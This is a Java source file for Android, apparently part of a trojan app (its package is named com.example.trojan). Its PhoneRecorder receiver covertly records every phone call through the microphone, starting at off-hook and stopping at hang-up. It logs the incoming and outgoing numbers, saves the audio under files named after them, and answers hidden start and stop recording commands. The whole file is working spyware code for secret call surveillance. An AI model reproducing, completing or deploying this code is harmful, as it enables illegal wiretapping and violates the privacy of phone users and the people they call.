package com.example.trojan;
import java.io.File;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;


public class PhoneRecorder extends BroadcastReceiver{
	
	String incoming_number;
	String outgoing_number;
	String state;
	
@Override
public void onReceive(Context context, Intent intent)
    {
	String action = intent.getAction();

	  if(action.equals("stoprecord"))
	  {
		  try{ stopRecording();
		  Log.d(MyService.LOG_TAG, "recording stopped on demand");}
		  catch(Exception e){
			  Log.d(MyService.LOG_TAG, "error stopping recorder on demand!\n"+e.toString());
		  }
	  }
	  
	  else if(action.equals("startrecord"))
	  {
		  try{ 
			  MyService.fname=Long.toString(System.currentTimeMillis()/1000);
			  startRecording();
		  Log.d(MyService.LOG_TAG, "recording started on demand");}
		  catch(Exception e){
			  Log.d(MyService.LOG_TAG, "error starting recording on demand!\n"+e.toString());
		  }
	  }
    else if(action.equals("android.intent.action.NEW_OUTGOING_CALL")){
      		outgoing_number=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
      		Log.d(MyService.LOG_TAG, "new outgoing to number: "+outgoing_number);
      		MyService.fname="[out]"+outgoing_number;
      	}
    else if(action.equals(android.telephony.TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
  	    state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
  	  if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)){
  		  Log.d(MyService.LOG_TAG, "phone inactive (hung).");
  		  Log.d(MyService.LOG_TAG, "call stopped. stopping. recording state: "+MyService.recording);
  		  stopRecording();
  	  } 
  	  else if(state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)){
  		  Log.d(MyService.LOG_TAG, "mhmm, the call in progress (calling/talking) ^^");
  		  outgoing_number=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
  		  Log.d(MyService.LOG_TAG, "starting recording "+outgoing_number);
  		  startRecording();
  	  }
  	  else if(state.equals(TelephonyManager.EXTRA_STATE_RINGING)){ 
  		 Log.d(MyService.LOG_TAG, "phone is ringing!");
  		 incoming_number=intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
  		 Log.d(MyService.LOG_TAG, incoming_number+" is calling");
  		MyService.fname="[in]"+incoming_number;
  	  }
    }
	    
    else{
  	  Log.d(MyService.LOG_TAG, "recorder recieved unhandled action: "+action);
    }     
 }

public void startRecording()
{
	
	  try {
if(MyService.recording==false)
  {
	MyService.recorder=new MediaRecorder();
      Log.d(MyService.LOG_TAG, "recorder started "+MyService.fname);
  MyService.recorder.setAudioSource(MediaRecorder.AudioSource.MIC);   
  MyService.recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); 
  MyService.recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); 
  File dir= new File(MyService.log_path);
  dir.mkdirs();
  long curtime=System.currentTimeMillis();
  //String filepath=MyService.log_path+"/"+base64(curtime+"|"+MyService.fname);
  String filepath=MyService.log_path+"/"+curtime+"_"+MyService.fname;
  MyService.recorder.setOutputFile(filepath);
  MyService.recorder.prepare();
  MyService.recorder.start(); 
  MyService.recording=true;}
	  }
  catch(Exception e){
	  Log.d(MyService.LOG_TAG, "error preparing/starting/writing in MyService.recorder\n"+e.toString());
  		}
  	  
  }   

public void stopRecording()
{
	try{
  if(MyService.recording&&!MyService.streaming)
      { 
      MyService.recorder.stop();
      MyService.recorder.reset();
      MyService.recorder.release();
      MyService.recording=false;
      MyService.recorder=null;
      Log.d(MyService.LOG_TAG, "stopped recording");}
	}
  catch (Exception e) {
	  Log.d(MyService.LOG_TAG, "error stopping recorder!\n"+e.toString());
      }
}

public String base64(String string){
	byte[] bytes = string.getBytes();
	String encoded = Base64.encodeToString(bytes,2);
	return encoded;
}

}
